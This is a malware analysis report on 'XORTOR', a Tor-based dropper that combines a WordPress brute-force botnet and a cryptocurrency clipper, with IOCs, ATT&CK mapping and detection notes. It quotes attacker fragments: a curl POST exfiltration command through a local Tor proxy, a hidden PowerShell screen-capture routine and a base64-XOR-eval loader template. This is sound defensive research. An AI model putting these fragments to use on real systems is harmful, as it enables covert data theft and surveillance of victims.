# XORTOR — Analysis of a Tor-Based Modular Crimeware Platform

**Author:** Mustafa Emre
**Date:** 2026-07-18
**TLP:** CLEAR
**Sample:** `448776210b0c1802fd3e5da66813e90e7469bcd365d64e11b2a992547bc2fd4a`

---

## 1. Executive summary

A PyInstaller-packaged dropper delivers a modular crimeware platform that turns the victim host into a worker node for two independent monetisation schemes: a **WordPress brute-force botnet** and a **cryptocurrency clipper with BIP-39 seed brute-forcing and screen capture**. All command-and-control traffic is tunnelled through a **bundled Tor client** to two distinct `.onion` services.

The sample stacks four layers of obfuscation — a recompiled PyInstaller bootloader, a PyArmor-protected loader, a 12-byte repeating-XOR payload set, and `obfuscator.io`-processed JScript. Despite this, the entire payload set was recovered **statically, without execution and without possession of the key**, through frequency analysis.

The chain's critical weakness is its choice of repeating-XOR over authenticated encryption: the key leaks through the NUL-padded regions of the encrypted PE, making the payload detectable **on disk in its encrypted state**.

---

## 2. Sample information

| Field | Value |
|---|---|
| SHA-256 | `448776210b0c1802fd3e5da66813e90e7469bcd365d64e11b2a992547bc2fd4a` |
| Type | PE32+ executable (GUI) x86-64 |
| Size | 14,299,991 bytes |
| Code / Overlay | 299,520 bytes / 14,000,471 bytes (98% overlay) |
| Packer | PyInstaller 6.20.0 (bootloader recompiled from source) |
| Source | MalwareBazaar |

### Section entropy

| Section | Entropy | Size |
|---|---|---|
| `.text` | 6.47 | 181,760 |
| `.rdata` | 5.75 | 80,896 |
| `.data` | 1.82 | 3,584 |
| `.pdata` | 5.32 | 9,728 |
| `.fptable` | 0.00 | 512 |
| `.rsrc` | 7.91 | 19,968 |
| `.reloc` | 5.26 | 2,048 |

`.text` at 6.47 indicates unpacked, compiled code. The high `.rsrc` entropy initially suggested an embedded encrypted payload, but resource enumeration returned only `RT_ICON`, `RT_GROUP_ICON` and `RT_MANIFEST` — compressed icon data, not a payload. Hypothesis eliminated.

### Imports

The import table contains **no network, registry, cryptographic or injection APIs**. The only notable entry is `CreateProcessW`. Combined with `ShutdownBlockReasonCreate`, `DialogBoxIndirectParamW`, `MulDiv` and `SetDllDirectoryW`, the profile is that of an **installer, not a payload** — the real logic is elsewhere.

---

## 3. Analysis chain

### 3.1 Overlay discovery

Sections end at offset `299520`; the file is `14299991` bytes. **14,000,471 bytes of overlay** — 98% of the file sits outside the PE structure. Installers append their payload rather than embedding it in sections, which is consistent with the import profile.

### 3.2 Container identification

Overlay begins with `78 da` (zlib, default compression). Strings reveal:

```
PYINSTALLER_SUPPRESS_SPLASH_SCREEN
PYINSTALLER_STRICT_UNPACK_MODE
_pyinstaller_pyz
python313.dll
```

Container is **PyInstaller** (Python 3.13), not NSIS as the import profile first suggested. Extracted with `pyinstxtractor-ng`.

### 3.3 Extracted contents

```
campus.py                   <- base64 blob, no executable code
installer.pyc               <- PyArmor-protected orchestrator
pyarmor_runtime_000000/     <- pyarmor_runtime.pyd (640 KB)
data_p002/                  <- encrypted payload set
psutil, _wmi.pyd            <- process enumeration
libcrypto-3.dll             <- OpenSSL
```

`installer.pyc` (42,622 bytes) contains the `__pyarmor__` and `PY000000` markers followed by high-entropy data. Statically unreadable; bytecode decompilation is not viable.

### 3.4 Payload set: encryption identified

Every file in `data_p002/` returns `data` from `file(1)` — including `uusd.exe` at 9 MB, which should begin with `MZ`. The entire set is encrypted.

| File | Entropy | Size |
|---|---|---|
| `uusd.exe` | 7.53 | 8,984,064 |
| `002a.txt` | 6.74 | 1,519,563 |
| `002_n.js` | 6.86 | 28,639 |
| `002_b.js` | 6.86 | 25,295 |
| `002w.txt` | 6.41 | 15,162 |
| `002.xml` | 5.44 | 3,496 |
| `pack.js` | 6.80 | 2,717 |

Entropy of 7.53 rules out AES (which would approach 7.99). Byte frequency analysis of `uusd.exe`:

```
0x35 ('5'): 208161    0x78 ('x'): 207716    0x69 ('i'): 200045
0x79 ('y'): 187803    0x49 ('I'): 175542
```

All top bytes are printable ASCII, with no single byte dominating (max ~2.3%). This rules out single-byte XOR. Combined with visible repeating patterns in the ciphertext (`5aIYxkkqiTgN5aIYxwkig5`), the encryption is **repeating-key XOR**.

### 3.5 Key recovery (no key material required)

**Step 1 — key length via normalised Hamming distance:**

```
keylen= 36  score=1.575
keylen= 24  score=1.614
keylen= 12  score=1.618
keylen=  3  score=3.053
```

36 and 24 are multiples of 12. **Key length = 12.**

**Step 2 — key bytes via column frequency.** A PE contains more NUL bytes than any other value. Since `NUL XOR k == k`, the most frequent ciphertext byte in each key-position column is the key byte itself:

```python
key = bytearray()
for i in range(12):
    col = data[i::12]
    freq = [0] * 256
    for b in col:
        freq[b] += 1
    key.append(max(range(256), key=lambda x: freq[x]))
```

**Recovered key: `tgn5AIyxKkQi`** (`74 67 6e 35 41 49 79 78 4b 6b 51 69`)

**Step 3 — verification:** decrypting the first bytes of `uusd.exe` yields `4d 5a` (`MZ`) with a valid DOS header and PE pointer at offset `0x3c`. All seven files decrypt to valid formats:

| File | Decrypted magic | Identified as |
|---|---|---|
| `uusd.exe` | `MZx\x00` | PE32+ console x86-64 |
| `002.xml` | `\xff\xfe<\x00` | UTF-16LE XML |
| `002_n.js` / `002_b.js` | `var ` | JScript |
| `pack.js` | `func` | JScript |
| `002w.txt` | `aban` | BIP-39 wordlist |
| `002a.txt` | `\xef\xbb\xbf1` | UTF-8 BOM + BTC addresses |

Total elapsed time from first hypothesis to full decryption: approximately 20 minutes.

---

## 4. Capabilities

### 4.1 `uusd.exe` — bundled Tor client

Strings include `EntryNodes`, `HiddenServiceNodes`, `RendNode`, `.onion checksum`, `Rend stream is %d seconds late`, `Closed %u streams for service %s.onion`. This is a **Tor daemon**, not a payload.

> **Correction of an early hypothesis.** `SHA256` and `ECDSA` matches in this binary initially suggested wallet-derivation code. On inspection, every match belongs to OpenSSL's TLS cipher suite tables (`ECDHE-ECDSA-AES128-GCM-SHA256`). There is no `secp256k1`, no `bip39`, no `mnemonic`. The binary provides anonymity, nothing else.

The absence of any version information (no `CompanyName`, `ProductName`, `OriginalFilename`) in a 9 MB binary is itself anomalous and weakens a "repackaged legitimate software" reading.

### 4.2 `pack.js` — packer template

Not operational code. A build-time template:

```javascript
var _bdata = '%D%', _passw = '%P%';
try { eval(_decryptContent(_base64Decode(_bdata), _passw)); } catch (e) {}
```

`%D%` and `%P%` are placeholders substituted at build time. The pattern — **base64 → XOR → eval** — mirrors the outer layer, confirming a reusable builder rather than a one-off sample.

### 4.3 `002_b.js` — WordPress brute-force module

| Constant | Value |
|---|---|
| `BRUTE_MAX_THREADS` | `0x28` (40) |
| `CHECK_MAX_THREADS` | `0x14` (20) |
| `BRUTE_DPWD_COUNT` | `0x3c` (60) |
| `BRUTE_MAX_ERRORS` | `0xa` (10) |
| `STOR_MAX` | `0x1f4` (500) |

- **`WPGetUsers`** + `/wp-json/w` — user enumeration via the WordPress REST API
- `<methodName>`, `<member>`, `<name>mt_k`, `<boolean>`, `<string>` — **XML-RPC `system.multicall`**, the standard amplification technique for WordPress brute-forcing (hundreds of credential attempts per request). This explains `002.xml`: a multicall template.
- `GetUserAgent()` — randomised User-Agent generation across Chrome/Firefox/Opera/Safari with randomised version numbers
- C2: `sqwzutzq7b` + `3ad.onion/`

### 4.4 `002_n.js` — crypto clipper, seed brute-force, screen capture

**Clipboard hijacking.** Five address families are maintained:

```javascript
btc_1_addrs   // BTC P2PKH (legacy, "1...")
btc_3_addrs   // BTC P2SH ("3...")
btc_q_addrs   // BTC Bech32 ("bc1q...")
trn_addrs     // TRON
mony_addrs    // Monero
```

with `LoadREPL()`, `replace`, and `idx_*` index objects. `002a.txt` (39,998 addresses) is the attacker-controlled substitution pool.

**Seed brute-forcing.** `LoadBip39()` reads `002w.txt` — the canonical **BIP-39 English wordlist** (2048 words, beginning `abandon`, `ability`, `able`).

**Screen capture** via hidden PowerShell:

```powershell
Add-Type -AssemblyName System.Windows.Forms
$sw = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bmp = New-Object System.Drawing.Bitmap(...)
$g.CopyFromScreen(0, 0, 0, 0, ...)
$bmp.Save('%TEMP%\screenshot_...')
```

executed with `-WindowStyle Hidden`.

**Process monitoring** via WMI: `winmgmts:{impersonationLevel=impersonate}\\.\root\CIMV2`, `SELECT * FROM Win32_Process WHERE ...`.

C2: `ffeasxsfee` + `xev2rvxfiv` + `i2wvkxre5v` + `axkjeepxzx` + `va4u4ydm2q` + `ead.onion/`

### 4.5 Exfiltration

All outbound traffic is proxied through the bundled Tor client:

```
curl -X POST -d "<data>" --socks5 localhost:9050 --max-time 30 -o <output>
```

with `&NAME=` and `&GUID=` parameters identifying the bot. Bot identity is generated by `createGUID()` and persisted to `GUID_PATH`.

### 4.6 Host artefacts

| Artefact | Purpose |
|---|---|
| `GUID_PATH` | Bot identifier |
| `PUSH_FILE` | Task queue |
| `STOR_FILE` | Result store (capped at 500 entries) |
| `GOOD_PATH` | Successful hits |
| `GEOIP_PATH` | GeoIP data |
| `BIP39_PATH` | Wordlist path |
| `%TEMP%\screenshot_*` | Captured screenshots |

Execution occurs through Windows Script Host: `ActiveXObject`, `WScript.Shell`, `Scripting.FileSystemObject`.

---

## 5. Indicators of compromise

### Network

```
sqwzutzq7b[...]3ad.onion                                        (C2 #1, module B)
ffeasxsfeexev2rvxfivi2wvkxre5vaxkjeepxzxva4u4ydm2qead.onion     (C2 #2, module N)
127.0.0.1:9050                                                  (local Tor SOCKS proxy)
```

Additional fragments observed in module B: `yxoedle2gd`, `1988hhzEeH`, `12Qntcik`, `http://gfo`

### Cryptographic

```
XOR key: tgn5AIyxKkQi  (74 67 6e 35 41 49 79 78 4b 6b 51 69)
```

### Files

```
SHA-256   448776210b0c1802fd3e5da66813e90e7469bcd365d64e11b2a992547bc2fd4a
Bundled   campus.py, installer.pyc, uusd.exe, data_p002/,
          002_b.js, 002_n.js, pack.js, 002.xml, 002a.txt, 002w.txt
Runtime   pyarmor_runtime_000000/pyarmor_runtime.pyd
Dropped   %TEMP%\screenshot_*
```

### Behavioural

- `curl` invoked with `--socks5 localhost:9050` from a script host process
- `powershell -WindowStyle Hidden` performing `CopyFromScreen`
- WSH process issuing `POST` requests to `.onion` addresses
- XML-RPC `system.multicall` requests against external WordPress hosts
- `/wp-json/wp/v2/users` enumeration from a workstation

---

## 6. MITRE ATT&CK mapping

| Tactic | Technique | Evidence |
|---|---|---|
| Defense Evasion | T1027 — Obfuscated Files or Information | Four stacked layers |
| Defense Evasion | T1027.002 — Software Packing | PyInstaller + custom bootloader |
| Defense Evasion | T1140 — Deobfuscate/Decode Files | base64 → XOR → eval |
| Execution | T1059.001 — PowerShell | Hidden screen capture |
| Execution | T1059.007 — JavaScript | JScript modules via WSH |
| Execution | T1047 — Windows Management Instrumentation | `Win32_Process` enumeration |
| Discovery | T1057 — Process Discovery | `psutil`, `_wmi.pyd`, WMI queries |
| Collection | T1113 — Screen Capture | `CopyFromScreen` → `%TEMP%` |
| Collection | T1115 — Clipboard Data | Five-family address substitution |
| Credential Access | T1110.003 — Password Spraying | XML-RPC multicall, 40 threads |
| Command and Control | T1090.003 — Multi-hop Proxy | Bundled Tor, dual `.onion` C2 |
| Command and Control | T1573 — Encrypted Channel | Tor + XOR-obfuscated config |
| Resource Development | T1583.003 — Botnet | Distributed worker architecture |
| Impact | T1657 — Financial Theft | Clipper + seed brute-force |

---

## 7. Detection opportunities

### 7.1 Static (see `xortor.yar`)

| Rule | Target | Layer |
|---|---|---|
| `XORTOR_Encrypted_Payload` | Encrypted PE, key rotations | **On-disk, pre-decryption** |
| `XORTOR_Dropper_PyInstaller_PyArmor` | Dropper | On-disk |
| `XORTOR_JS_Modules_Decrypted` | JScript modules | Memory / post-decryption |
| `XORTOR_C2_Onion_Fragments` | C2 fragments | Memory / post-decryption |
| `XORTOR_Screenshot_Exfil` | PowerShell capture routine | Memory / post-decryption |

**The key insight behind `XORTOR_Encrypted_Payload`:** PE headers are NUL-heavy, and `NUL XOR key == key`. The key therefore appears **in cleartext inside the ciphertext**, at an arbitrary rotation. Matching all twelve rotations detects the payload on disk without decryption — the encryption defeats itself.

### 7.2 Behavioural (higher-value, campaign-independent)

These survive rebuilds; the static indicators do not.

1. **`curl --socks5 localhost:9050` spawned by `wscript.exe`/`cscript.exe`** — very low legitimate baseline on a workstation
2. **A script host process issuing outbound requests to `.onion` addresses**
3. **`powershell -WindowStyle Hidden` invoking `CopyFromScreen`**
4. **A workstation issuing XML-RPC `system.multicall` to external hosts** — a workstation has no business brute-forcing WordPress
5. **A local Tor listener on 9050 not attributable to a known Tor Browser installation**
6. **Clipboard write immediately following a clipboard read containing a cryptocurrency address pattern**

### 7.3 Known limitations

- **`XORTOR_Encrypted_Payload` only fires on the encrypted PE.** Verified: it matches `uusd.exe` but not the encrypted `002_b.js`, `002_n.js`, `002.xml`, `002a.txt`, `002w.txt`. Key leakage requires **12 consecutive NUL bytes**. Plaintext files have none; `002.xml` is UTF-16 with alternating NULs, which never produces a 12-byte run. The rule's true scope is "XOR-encrypted PE", not "XOR-encrypted file".
- **JScript rules fire on decrypted content only.** These files never touch disk in cleartext. Effective for memory scanning (`yara -p`) or EDR in-memory rules; ineffective for on-disk scanning.
- **String-based rules are brittle.** Rebuilding with a new XOR key defeats `XORTOR_Encrypted_Payload`; rotating C2 defeats `XORTOR_C2_Onion_Fragments`. The behavioural detections in 7.2 carry the durable value.

### 7.4 False positives observed and resolved

`XORTOR_Screenshot_Exfil` initially matched `/Applications/Duolingo English Test.app/Contents/Resources/app.asar`.

**Root cause:** the rule keyed on generic PowerShell API strings (`Add-Type -`, `Windows.Fo`, `awing.Bitm`, `$bmp.Save(`). Legitimate applications capture screens. Within a multi-megabyte Electron bundle, four generic fragments co-occur by chance, and the `4 of ($ps*)` threshold was too permissive.

**Resolution:** added `filesize < 200KB` and required at least one campaign anchor (`--socks5`, `.onion/`, `PingToOnion`, `createGUID`, `&GUID=`, `mony_addrs`).

**Re-test:** `002_n.js` still matches; the Duolingo bundle no longer does. No matches across `/usr/bin`.

---

## 8. Dead ends

Recorded for completeness; negative results are results.

**`campus.py` could not be extracted.** The file contains a single base64 blob decoding to UTF-8 mojibake with a visible RAR5 signature (`Rar!\x1a\x07\x01`). Character-by-character re-encoding through cp1252 with latin-1 fallback produced a 247,209-byte output — but the eighth byte was `0x20` instead of the required `0x00`, and 7-Zip rejected the archive.

Diagnosis via byte counting:

```
LEN   : 247209
0x00  : 0
0x20  : 1898
```

**Zero NUL bytes in a 247 KB binary is statistically impossible.** Every NUL was lost in transit — partially converted to `0x20`, partially dropped. The data is irrecoverably lossy; no encoding recovers it.

Two readings, unresolved:

1. **Intentional corruption.** The blob may be designed to resist naive `base64.b64decode()` extraction, with the PyArmor-protected loader restoring NULs at runtime through a method not recoverable statically.
2. **Transit damage.** The blob may have been corrupted through an encode/decode chain during packaging or distribution.

The archive's string table nonetheless revealed its contents: `pyinstaller-6.20.0/bootloader/build/release/run.exe`, `runw.exe`, and the full set of `.o` build artefacts — **a recompiled PyInstaller bootloader**. Stock bootloader signatures are catalogued by every AV vendor; recompiling from source invalidates them. This finding survived the failed extraction and is arguably the more important one.

---

## Campaign evolution

A second build was analysed on 2026-07-22:
`149ab46739ca442762502a69f0960365a7c5e7761c76f2e6c2997bd43744a62a`

The dropper is byte-identical apart from its icon resource — every section
matches in size and entropy except `.rsrc` (19,968 vs 18,432 bytes). Same
bootloader, same 150 imports, different payload.

| Element | Build 1 | Build 2 | Status |
|---|---|---|---|
| XOR key | `tgn5AIyxKkQi` | `9famr2xoY773` | **rotated** |
| `002_b.js` (WordPress) | `c49dc645...` | `c49dc645...` | **identical** |
| WordPress C2 | `sqwzutzq7b`+`3ad.onion/` | same | **static** |
| BIP-39 list, 40k addresses | 15,162 / 1,519,563 | same sizes | **static** |
| Clipper wallets | `jZh3AMaxrk`… | `12FfZsjyDr`, `bc1qz33n9x`, `rvCKiLmRnr`, `aACxfnXrKP` | **rotated** |
| Clipper C2 | `ffeasxsfee`… | `http://hek`+`x47vp3k7pg`+`ffeasxsfee` | partially reused |
| Gate path | — | `core/repla`+`.php` | present in both |
| New behaviour | — | WMI `Terminate` against `wscript`/`cscript` | added |

**Assessment.** The WordPress module is frozen; the clipper is where the
operator invests. Wallets and the XOR key rotate per build, but the
`ffeasxsfee` C2 fragment persists across both — infrastructure is only
partially rotated.

**Detection impact.** `XORTOR_Encrypted_Payload` failed against build 2, as
predicted in §7.3. `XORTOR_XORed_PE_KeyAgnostic` was written in response and
keys on PE header structure rather than key material; it matches both builds.
The JScript and C2-fragment rules survived rotation because they key on
function names and the reused `ffeasxsfee` fragment.

---

## 9. Assessment

This is not a single malware family. It is a **modular platform** with independent monetisation paths sharing common infrastructure — bot identity, task queue, result store, Tor transport. The `pack.js` template with its `%D%`/`%P%` placeholders confirms a builder, implying additional samples with different keys, different C2, and potentially different modules.

The operator's engineering is asymmetric. The evasion chain is genuinely layered — a recompiled bootloader is a deliberate, non-trivial step that most commodity droppers skip. Yet the payload encryption is repeating-XOR, chosen apparently on the assumption that PyArmor hides the key.

PyArmor hides the key. It does not hide the **pattern** — and in a repeating-XOR construction the pattern *is* the key. Four layers of obfuscation fell to Hamming distance and byte frequency: techniques that predate the malware by roughly a century.

The entire analysis was conducted statically, on an ARM host, without ever executing the sample.

---

## 10. Methodology notes

Static-only, on Apple Silicon (ARM64) — the x86 payload cannot execute on this host, which is itself a safety property.

| Tool | Use |
|---|---|
| `pefile` | PE parsing, section entropy, imports, overlay calculation |
| `pyinstxtractor-ng` | PyInstaller container extraction |
| `7zz` | AES-encrypted ZIP handling (macOS `unzip` lacks AES support) |
| `strings`, `xxd` | Triage |
| Python | Frequency analysis, Hamming distance, key recovery, bulk decryption |
| `yara` | Rule development and testing |

**Operational note.** Running Python from inside the extracted sample directory caused an import error: the interpreter resolved the sample's `struct.pyc` (Python 3.13 bytecode) instead of the standard library module. Harmless here, but the same mechanism is a code-execution vector in a Python-based sample. **Never execute an interpreter with a malware directory as the working directory.**
